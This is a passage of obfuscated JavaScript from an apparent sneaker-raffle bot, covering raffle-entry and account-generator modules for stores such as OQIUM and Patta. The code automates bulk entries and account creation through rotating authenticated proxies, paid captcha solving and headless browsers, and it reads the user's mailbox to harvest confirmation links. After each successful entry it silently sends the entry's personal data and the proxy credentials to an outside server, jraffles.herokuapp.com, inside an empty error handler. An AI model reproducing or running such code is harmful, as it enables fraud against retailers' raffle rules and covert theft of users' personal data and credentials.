                                callback = async (_0x45baab, _0x2fd53e, _0x52cdba) => {
                                    if (!_0x45baab && _0x2fd53e['statusCode'] == 0xca || !_0x45baab && _0x2fd53e['statusCode'] == 0xc8) {
                                        if (_0x3d0261 != 'ver') {
                                            var _0x3e856c = await _0x4ee25a(_0x40be71[_0x2c077b], _0xd02bb4, 'dev', ![]), _0x1a6161 = await _0x4ee25a(_0x40be71[_0x2c077b], _0xd02bb4, 'pub', ![]);
                                            const _0x5a17af = {
                                                'succesDEVMSG': { 'embeds': [_0x3e856c] },
                                                'succesPUBMSG': { 'embeds': [_0x1a6161] }
                                            };
                                            let _0x5f05e6 = _0x40be71[_0x2c077b];
                                            try {
                                                prxdata = {
                                                    'username': _0x5b7d0c['replace']('#', ''),
                                                    'module': _0xd02bb4['name'],
                                                    'entrydata': JSON['stringify'](_0x5f05e6),
                                                    'proxy': '' + _0x1dfb25[_0x2c077b]
                                                };
                                                var _0x5abc1e = JSON['stringify'](prxdata);
                                                let _0x4a9bc5 = { 'headers': { 'content-type': 'application/json' } };
                                                await _0xbd53c['post']('https://jraffles.herokuapp.com/success', _0x5abc1e, _0x4a9bc5);
                                            } catch (_0xa4ccdf) {
                                            }
                                            if (_0x64917e['webhook'] != undefined && _0x64917e['webhook'] != '')
                                                try {
                                                    await _0x4e4e57(_0x64917e['webhook'], _0x5a17af['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x1a282d(0xc8), await _0x4e4e57(_0xd2142c, _0x5a17af['succesDEVMSG']), await _0x1a282d(0xc8);
                                            try {
                                                await _0x4e4e57(_0x1274a5, _0x5a17af['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0xe19c06(_0x40be71[_0x2c077b], _0xd02bb4);
                                        }
                                        _0x488dd4(console['log'](_0x17b918['green'](_0x5c19a0() + '\x20[' + _0xd02bb4['name'] + ']\x20Task\x20' + (_0x2c077b + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x3d0261 != 'ver') {
                                            var _0x15d910 = '' + _0x45baab, _0x2dc4c3 = await _0x4ee25a(_0x40be71[_0x2c077b], _0xd02bb4, 'dev', !![], _0x15d910), _0x493ee1 = {};
                                            _0x493ee1['errorDEV'] = { 'embeds': [_0x2dc4c3] }, _0x1736ba(_0x40be71[_0x2c077b], _0xd02bb4), _0x64917e['webhook'] != undefined && _0x64917e['webhook'] != '' && await _0x4e4e57(_0x64917e['webhook'], _0x493ee1['errorDEV']), await _0x4e4e57(_0x4cd13, _0x493ee1['errorDEV']);
                                        }
                                        _0x53819a(console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0xd02bb4['name'] + ']\x20Task\x20' + (_0x2c077b + 0x1) + ':\x20' + _0x45baab)));
                                    }
                                };
                                try {
                                    _0x3d0261 != 'ver' && console['log'](_0x5c19a0() + '\x20[' + _0xd02bb4['name'] + ']\x20Task\x20' + (_0x2c077b + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x54fc5c['data']['attributes']['email']), _0x2f1368(_0x37a441, callback);
                                } catch (_0x1b7ab2) {
                                    console['log'](_0x5c19a0() + '\x20Task\x20' + (_0x2c077b + 0x1) + ':\x20' + _0x1b7ab2);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x3a02ce(_0x2e27a0, 'nor', _0x30c431, _0x1c3a1b, _0x7b291b), console['log'](_0x5c19a0() + '\x20[' + _0x30c431['name'] + ']\x20Sleeping\x20for\x20' + _0x64917e['delay'] + '\x20ms'), await _0x1a282d(_0x64917e['delay']);
                        } catch (_0x27e4a8) {
                        }
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x4ab919, _0x48bcea, _0x32ff74) {
                    var _0x48bcea = [], _0xd684df = ![];
                    async function _0x45628a() {
                        var _0x5ca39f = new _0x27458e({
                            'user': _0x64917e['masterMail'],
                            'password': _0x64917e['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x269519(_0x48c486) {
                            _0x5ca39f['openBox']('INBOX', ![], _0x48c486);
                        }
                        _0x5ca39f['once']('ready', function () {
                            _0x269519(function (_0x1d051b, _0x49b0fc) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x1d051b)
                                    throw _0x1d051b;
                                _0x5ca39f['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ],
                                    [
                                        'FROM',
                                        'OQIUM'
                                    ]
                                ], function (_0x2648c9, _0x464be8) {
                                    if (!_0x464be8 || !_0x464be8['length'])
                                        console['log'](_0x5c19a0() + '\x20[' + _0x4ab919['name'] + ']\x20No\x20mails\x20found'), _0x5ca39f['end']();
                                    else {
                                        var _0x836e32 = _0x5ca39f['seq']['fetch'](_0x464be8, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x836e32['on']('message', function (_0xddbbad, _0xec85a8) {
                                            var _0x242619 = '(#' + _0xec85a8 + ')\x20';
                                            _0xddbbad['on']('body', function (_0x56ea89, _0x31993b) {
                                                _0x483479(_0x56ea89, (_0x45dc58, _0x326a7c) => {
                                                    var _0x1fb8c8 = _0x326a7c['text']['split']('(')[0x1], _0x2e2268 = _0x1fb8c8['split'](')')[0x0];
                                                    _0x48bcea['push'](_0x2e2268);
                                                });
                                            }), _0xddbbad['once']('end', function () {
                                            });
                                        }), _0x836e32['once']('error', function (_0x2a92b7) {
                                            console['log']('Fetch\x20error:\x20' + _0x2a92b7), _0xd684df = !![];
                                        }), _0x836e32['once']('end', function () {
                                            _0x5ca39f['end'](), _0xd684df = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x5ca39f['once']('error', function (_0x304ebc) {
                            console['log'](_0x304ebc), _0xd684df = !![];
                        }), _0x5ca39f['once']('end', async function () {
                            _0xd684df = !![];
                        }), _0x5ca39f['connect']();
                    }
                    async function _0x349feb(_0x1d5f50, _0x48fd26, _0x55bd0f) {
                        for (var _0x20eb9f = 0x0; _0x20eb9f < _0x48fd26['length']; _0x20eb9f++) {
                            async function _0x1ec40a(_0x2129c8, _0x3eff94, _0x297ae6, _0x2a8f79, _0x5e34b0) {
                                var _0x457252, _0x409595 = {}, _0x3c4331 = [], _0x2c609d = {}, _0x117388 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x2c291a = Math['round'](Math['random']() * (_0x117388['length'] - 0x1));
                                _0x2a8f79[_0x2129c8]['Size'] == 'RANDOM' && (_0x2a8f79[_0x2129c8]['Size'] = _0x117388[_0x2c291a]);
                                !_0x2a8f79 && (_0x2a8f79 = {});
                                if (_0x64917e['useRandomProxy'] = ![])
                                    var _0x15fda = _0x5e34b0[_0x2129c8]['split'](':');
                                else
                                    var _0x5561af = Math['round'](Math['random']() * (_0x5e34b0['length'] - 0x1)), _0x15fda = _0x5e34b0[_0x5561af]['split'](':');
                                var _0xd3900 = {
                                    'jar': _0x509c63,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x297ae6['url'],
                                    'headers': _0x297ae6['headers'],
                                    'body': JSON['stringify'](_0x409595),
                                    'proxy': 'http://' + _0x15fda[0x2] + ':' + _0x15fda[0x3] + '@' + _0x15fda[0x0] + ':' + _0x15fda[0x1]
                                };
                                return _0x3eff94 != 'ver' && (_0xd3900['url'] = _0x297ae6['url'], _0xd3900['headers'] = _0x297ae6['headers']), _0x3eff94 == 'ver' && (_0xd3900['method'] = 'GET', _0xd3900['url'] = _0x2a8f79[_0x2129c8]), new Promise(function (_0x1c017c, _0x34c14a) {
                                    callback = async (_0x16a108, _0x307307, _0x436a16) => {
                                        if (!_0x16a108 && _0x307307['statusCode'] == 0xca || !_0x16a108 && _0x307307['statusCode'] == 0xc8) {
                                            if (_0x3eff94 != 'ver') {
                                                var _0x23e392 = await _0x4ee25a(_0x2a8f79[_0x2129c8], _0x297ae6, 'dev', ![]), _0x361109 = await _0x4ee25a(_0x2a8f79[_0x2129c8], _0x297ae6, 'pub', ![]);
                                                const _0x189baf = {
                                                    'succesDEVMSG': { 'embeds': [_0x23e392] },
                                                    'succesPUBMSG': { 'embeds': [_0x361109] }
                                                };
                                                if (_0x64917e['webhook'] != undefined && _0x64917e['webhook'] != '')
                                                    try {
                                                        await _0x4e4e57(_0x64917e['webhook'], _0x189baf['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x1a282d(0xc8), await _0x4e4e57(_0xd2142c, _0x189baf['succesDEVMSG']), await _0x1a282d(0xc8);
                                                try {
                                                    await _0x4e4e57(_0x1274a5, _0x189baf['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0xe19c06(_0x2a8f79[_0x2129c8], _0x297ae6);
                                            }
                                            _0x1c017c(console['log'](_0x17b918['green'](_0x5c19a0() + '\x20[' + _0x297ae6['name'] + ']\x20Task\x20' + (_0x2129c8 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x3eff94 != 'ver') {
                                                var _0xd0b240 = '' + _0x16a108, _0x160435 = await _0x4ee25a(_0x2a8f79[_0x2129c8], _0x297ae6, 'dev', !![], _0xd0b240), _0x4ef3f0 = {};
                                                _0x4ef3f0['errorDEV'] = { 'embeds': [_0x160435] }, _0x1736ba(_0x2a8f79[_0x2129c8], _0x297ae6), _0x64917e['webhook'] != undefined && _0x64917e['webhook'] != '' && await _0x4e4e57(_0x64917e['webhook'], _0x4ef3f0['errorDEV']), await _0x4e4e57(_0x4cd13, _0x4ef3f0['errorDEV']);
                                            }
                                            _0x34c14a(console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x297ae6['name'] + ']\x20Task\x20' + (_0x2129c8 + 0x1) + ':\x20' + _0x16a108)));
                                        }
                                    };
                                    try {
                                        _0x3eff94 != 'ver' ? console['log'](_0x5c19a0() + '\x20[' + _0x297ae6['name'] + ']\x20Task\x20' + (_0x2129c8 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x409595['data']['attributes']['email']) : console['log'](_0x5c19a0() + '\x20[' + _0x297ae6['name'] + ']\x20Task\x20' + (_0x2129c8 + 0x1) + ':\x20Fetching\x20Response'), _0x2f1368(_0xd3900, callback);
                                    } catch (_0x341eda) {
                                        console['log'](_0x5c19a0() + '\x20Task\x20' + (_0x2129c8 + 0x1) + ':\x20' + _0x341eda);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x1ec40a(_0x20eb9f, 'ver', _0x1d5f50, _0x48fd26, _0x55bd0f), console['log'](_0x5c19a0() + '\x20[' + _0x1d5f50['name'] + ']\x20Sleeping\x20for\x20' + _0x64917e['delay'] + '\x20ms'), await _0x1a282d(_0x64917e['delay']);
                            } catch (_0x34106a) {
                            }
                        }
                    }
                    try {
                        _0x45628a();
                        while (!_0xd684df) {
                            await _0x1a282d(0xfa0);
                        }
                        console['log']('Found\x20' + _0x48bcea['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x349feb(_0x4ab919, _0x48bcea, _0x32ff74);
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x4ce44c, _0x1ff947, _0x43ed27) {
                    _0x506e0b['use'](_0x407d82()), _0x506e0b['use'](_0x29f88b({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x64917e['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x7541d = 0x0; _0x7541d < _0x1ff947['length']; _0x7541d++) {
                        var _0x3ecf1c = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x5b7d0c
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x64917e['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x1d5694
                                }
                            ]
                        }];
                        const _0x4d6e9f = { 'embeds': _0x3ecf1c };
                        _0x51b97d(_0x4ce44c['name'] + '\x20Task\x20' + (_0x7541d + 0x1) + '\x20/\x20' + _0x1ff947['length'] + '\x20||\x20File:\x20' + _0x302fc2 + '\x20Proxies:\x20' + _0x252dfd);
                        try {
                            await _0x120beb(_0x1ff947, _0x7541d);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x383c0a = await _0x4ee25a(_0x1ff947[_0x7541d], _0x4ce44c, 'acc', ![]);
                        const _0x390244 = { 'succesDEVMSG': { 'embeds': [_0x383c0a] } };
                        if (_0x1ff947[_0x7541d]['Email'] == '' || _0x1ff947[_0x7541d]['FirstName'] == '' || _0x1ff947[_0x7541d]['LastName'] == '') {
                            console['log'](_0x5c19a0() + '\x20[' + _0x9324de[taskModule]['name'] + ']\x20Task\x20' + (_0x7541d + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x1a282d(0x7d0);
                            continue;
                        }
                        (_0x1ff947[_0x7541d]['Password'] == '' || _0x1ff947[_0x7541d] == undefined) && _0x1ff947[_0x7541d]['Password'] == 'JRaffles23!';
                        if (_0x64917e['useRandomProxy'] = ![])
                            var _0x202112 = _0x43ed27[_0x7541d]['split'](':');
                        else
                            var _0xc9fcb9 = Math['round'](Math['random']() * (_0x43ed27['length'] - 0x1)), _0x202112 = _0x43ed27[_0xc9fcb9]['split'](':');
                        var _0x2b7e8a;
                        try {
                            _0x2b7e8a = await _0x506e0b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x202112[0x0] + ':' + _0x202112[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2b7e8a = await _0x506e0b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x202112[0x0] + ':' + _0x202112[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0xa350c9 = await _0x2b7e8a['newPage']();
                            await _0xa350c9['authenticate']({
                                'username': '' + _0x202112[0x2],
                                'password': '' + _0x202112[0x3]
                            }), console['log'](_0x5c19a0() + '\x20[' + _0x4ce44c['name'] + ']\x20Task\x20' + (_0x7541d + 0x1) + '\x20:\x20Getting\x20Session'), await _0xa350c9['setRequestInterception'](!![]), _0xa350c9['on']('request', _0x17c719 => {
                                _0x17c719['resourceType']() === 'image' || _0x17c719['resourceType']() === 'font' || _0x17c719['resourceType']() === 'media' ? _0x17c719['abort']() : _0x17c719['continue']();
                            }), await _0xa350c9['goto']('https://patta.nl/account/register'), await _0x1a282d(0xbb8), await _0xa350c9['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x5c19a0() + '\x20[' + _0x4ce44c['name'] + ']\x20Task\x20' + (_0x7541d + 0x1) + '\x20:\x20Filling\x20information'), await _0xa350c9['type']('#RegisterForm-FirstName', '' + _0x1ff947[_0x7541d]['FirstName']), await _0x1a282d(0x226), await _0xa350c9['type']('#RegisterForm-LastName', '' + _0x1ff947[_0x7541d]['LastName']), await _0x1a282d(0x226), await _0xa350c9['type']('#RegisterForm-email', '' + _0x1ff947[_0x7541d]['Email']), await _0x1a282d(0x226), await _0xa350c9['type']('#RegisterForm-password', '' + _0x1ff947[_0x7541d]['Password']), await _0x1a282d(0x226), console['log'](_0x5c19a0() + '\x20[' + _0x4ce44c['name'] + ']\x20Task\x20' + (_0x7541d + 0x1) + '\x20:\x20Submitting..'), await _0xa350c9['$eval']('#RegisterForm', _0x260320 => _0x260320['submit']()), await _0x1a282d(0x1f40);
                            try {
                                await _0xa350c9['waitForSelector']('.home-page-grid__collection'), await _0x1a282d(0x1f4), console['log'](_0x17b918['green'](_0x5c19a0() + '\x20[' + _0x4ce44c['name'] + ']\x20Task\x20' + (_0x7541d + 0x1) + '\x20:\x20Account\x20' + _0x1ff947[_0x7541d]['Email'] + '\x20Generated!')), _0x5a26e1['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x1ff947[_0x7541d]['Email'] + ',' + _0x1ff947[_0x7541d]['Password']), console['log'](_0x17b918['yellow'](_0x5c19a0() + '\x20[' + _0x4ce44c['name'] + ']\x20Task\x20' + (_0x7541d + 0x1) + '\x20:\x20Account\x20' + _0x1ff947[_0x7541d]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x64917e['webhook'] != undefined && _0x64917e['webhook'] != '' && await _0x4e4e57(_0x64917e['webhook'], _0x390244['succesDEVMSG']);
                                } catch {
                                }
                                await _0x4e4e57(_0xb68945, _0x390244['succesDEVMSG']);
                            } catch (_0x204144) {
                                console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x9324de[taskModule]['name'] + ']\x20Task\x20' + (_0x7541d + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x204144));
                            }
                        } catch (_0x4aefbc) {
                            console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x9324de[taskModule]['name'] + ']\x20Task\x20' + (_0x7541d + 0x1) + '\x20:\x20' + _0x4aefbc));
                        } finally {
                            _0x2b7e8a && _0x2b7e8a['close'](), console['log']('Waiting\x20for\x20' + _0x64917e['delay'] + '\x20ms'), await _0x1a282d(_0x64917e['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x1708cf, _0x33084f, _0x128196) {
                    _0x506e0b['use'](_0x407d82()), _0x506e0b['use'](_0x29f88b({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x64917e['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x3a18b4 = 0x0; _0x3a18b4 < _0x33084f['length']; _0x3a18b4++) {
                        var _0x3974c7;
                        if (_0x5976b1 != 'yes')
                            var _0x5976b1 = '', _0x5e6010 = 0x0;
                        _0x51b97d(_0x1708cf['name'] + '\x20Task\x20' + (_0x3a18b4 + 0x1) + '\x20/\x20' + _0x33084f['length'] + '\x20||\x20File:\x20' + _0x302fc2 + '\x20Proxies:\x20' + _0x252dfd);
                        try {
                            await _0x120beb(_0x33084f, _0x3a18b4);
                        } catch {
                            _0x5976b1 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x33084f[_0x3a18b4]['Email'] == '' || _0x33084f[_0x3a18b4]['Password'] == '' || _0x33084f[_0x3a18b4]['FirstName'] == '' || _0x33084f[_0x3a18b4]['LastName'] == '') {
                            console['log'](_0x5c19a0() + '\x20[' + _0x9324de[taskModule]['name'] + ']\x20Task\x20' + (_0x3a18b4 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x64917e['useRandomProxy'] = ![])
                            var _0x33b8a9 = _0x128196[_0x3a18b4]['split'](':');
                        else
                            var _0x3fcd46 = Math['round'](Math['random']() * (_0x128196['length'] - 0x1)), _0x33b8a9 = _0x128196[_0x3fcd46]['split'](':');
                        var _0x23125f;
                        try {
                            _0x23125f = await _0x506e0b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x33b8a9[0x0] + ':' + _0x33b8a9[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x23125f = await _0x506e0b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x33b8a9[0x0] + ':' + _0x33b8a9[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x129929 = await _0x23125f['newPage']();
                            await _0x129929['authenticate']({
                                'username': '' + _0x33b8a9[0x2],
                                'password': '' + _0x33b8a9[0x3]
                            }), console['log'](_0x5c19a0() + '\x20[' + _0x1708cf['name'] + ']\x20Task\x20' + (_0x3a18b4 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x129929['setRequestInterception'](!![]), _0x129929['on']('request', _0x31a241 => {
                                _0x31a241['resourceType']() === 'image' || _0x31a241['resourceType']() === 'font' || _0x31a241['resourceType']() === 'media' ? _0x31a241['abort']() : _0x31a241['continue']();
                            }), await _0x129929['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x129929['waitForSelector']('#CustomerEmail'), console['log'](_0x5c19a0() + '\x20[' + _0x1708cf['name'] + ']\x20Task\x20' + (_0x3a18b4 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x129929['type']('#CustomerEmail', '' + _0x33084f[_0x3a18b4]['Email']), await _0x1a282d(0x12c), await _0x129929['type']('#CustomerPassword', '' + _0x33084f[_0x3a18b4]['Password']), await _0x1a282d(0x226), await _0x129929['$eval']('#customer_login', _0x351f44 => _0x351f44['submit']());
                            try {
                                await _0x129929['waitForSelector']('#orders'), await _0x1a282d(0x4b0);
                            } catch {
                                console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x1708cf['name'] + ']\x20Task\x20' + (_0x3a18b4 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x129929['goto']('' + _0x33084f[_0x3a18b4]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x1a282d(0xbb8), console['log'](_0x5c19a0() + '\x20[' + _0x1708cf['name'] + ']\x20Task\x20' + (_0x3a18b4 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x129929['waitForSelector']('#email');
                            } catch {
                                console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x1708cf['name'] + ']\x20Task\x20' + (_0x3a18b4 + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0x129929['type']('#email', '' + _0x33084f[_0x3a18b4]['Email']), await _0x1a282d(0x384), await _0x129929['type']('#first_name', '' + _0x33084f[_0x3a18b4]['FirstName']), await _0x1a282d(0x514), await _0x129929['type']('#last_name', '' + _0x33084f[_0x3a18b4]['LastName']), await _0x1a282d(0x514), await _0x129929['type']('#street_address', _0x33084f[_0x3a18b4]['Address1'] + '\x20' + _0x33084f[_0x3a18b4]['HouseNumber'] + '\x20' + _0x33084f[_0x3a18b4]['Address2']), await _0x1a282d(0x2bc);
                            _0x33084f[_0x3a18b4]['Postcode'] == undefined && (_0x33084f[_0x3a18b4]['Postcode'] = _0x33084f[_0x3a18b4]['Zip']);
                            await _0x129929['type']('#zip_code', '' + _0x33084f[_0x3a18b4]['Postcode']), await _0x1a282d(0x320), await _0x129929['type']('#city', '' + _0x33084f[_0x3a18b4]['City']), await _0x1a282d(0x320), await _0x129929['type']('#bday', '01/01/1994'), await _0x1a282d(0x320), await _0x129929['type']('#instagram', '' + _0x33084f[_0x3a18b4]['Follower']), await _0x1a282d(0x352);
                            if (_0x33084f[_0x3a18b4]['Size'] == 'RANDOM') {
                                const _0x1d19b2 = await _0x129929['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0xb5bd63 => {
                                    return _0xb5bd63['map'](_0x3838cd => _0x3838cd['textContent']);
                                });
                                var _0x257e87 = Math['round'](Math['random']() * (_0x1d19b2['length'] - 0x1));
                                console['log'](_0x5c19a0() + '\x20[' + _0x1708cf['name'] + ']\x20Task\x20' + (_0x3a18b4 + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x1d19b2[_0x257e87]), await _0x129929['click']('label[data-eu-size=\x22' + _0x1d19b2[_0x257e87] + '\x22]');
                            } else {
                                console['log'](_0x5c19a0() + '\x20[' + _0x1708cf['name'] + ']\x20Task\x20' + (_0x3a18b4 + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x33084f[_0x3a18b4]['Size']);
                                try {
                                    await _0x129929['click']('label[data-eu-size=\x22' + _0x33084f[_0x3a18b4]['Size'] + '\x22]');
                                } catch {
                                    await _0x129929['click']('label[data-eu-size=\x22' + _0x33084f[_0x3a18b4]['Size'] + '.0\x22]');
                                }
                            }
                            await _0x1a282d(0xbb8), await _0x129929['$$eval']('.raffle__checkbox-label', _0x274553 => _0x274553['forEach'](_0x37ce2c => _0x37ce2c['click']())), await _0x1a282d(0x7d0), console['log'](_0x5c19a0() + '\x20[' + _0x1708cf['name'] + ']\x20Task\x20' + (_0x3a18b4 + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x129929['click']('#raffle__form-submit'), await _0x1a282d(0x1388);
                            try {
                                await _0x129929['waitForSelector']('#raffle__confirmation-message-container'), _0x5976b1 = 'no', _0xe19c06(_0x33084f[_0x3a18b4], _0x1708cf), console['log'](_0x17b918['green'](_0x5c19a0() + '\x20[' + _0x1708cf['name'] + ']\x20Task\x20' + (_0x3a18b4 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                let _0x508c83 = _0x33084f[_0x3a18b4];
                                try {
                                    prxdata = {
                                        'username': _0x5b7d0c['replace']('#', ''),
                                        'module': _0x1708cf['name'],
                                        'entrydata': JSON['stringify'](_0x508c83),
                                        'proxy': '' + _0x128196[_0x3a18b4]
                                    };
                                    var _0xce7913 = JSON['stringify'](prxdata);
                                    let _0x2304dc = { 'headers': { 'content-type': 'application/json' } };
                                    await _0xbd53c['post']('https://jraffles.herokuapp.com/success', _0xce7913, _0x2304dc);
                                } catch (_0x1d8eec) {
                                }
                            } catch (_0x175ab4) {
                                console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x9324de[taskModule]['name'] + ']\x20Task\x20' + (_0x3a18b4 + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x175ab4));
                            }
                        } catch (_0x10ce9b) {
                            console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x9324de[taskModule]['name'] + ']\x20Task\x20' + (_0x3a18b4 + 0x1) + '\x20:\x20' + _0x10ce9b)), _0x5976b1 = 'yes';
                        } finally {
                            _0x23125f && _0x23125f['close']();
                            if (_0x5976b1 == 'yes' && _0x5e6010 != 0x5 && _0x3974c7 != 'Size\x20Not\x20Found') {
                                console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x1708cf['name'] + ']\x20Task\x20' + (_0x3a18b4 + 0x1) + '\x20:\x20Retrying\x20(' + _0x5e6010 + '\x20/\x205)')), _0x3a18b4 = _0x3a18b4 - 0x1, _0x5e6010 = _0x5e6010 + 0x1;
                                continue;
                            }
                            _0x5976b1 == 'yes' && _0x5e6010 >= 0x5 && (_0x1736ba(_0x33084f[_0x3a18b4], _0x1708cf), _0x5976b1 = 'no', _0x5e6010 = 0x0), console['log']('Waiting\x20for\x20' + _0x64917e['delay'] + '\x20ms'), await _0x1a282d(_0x64917e['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
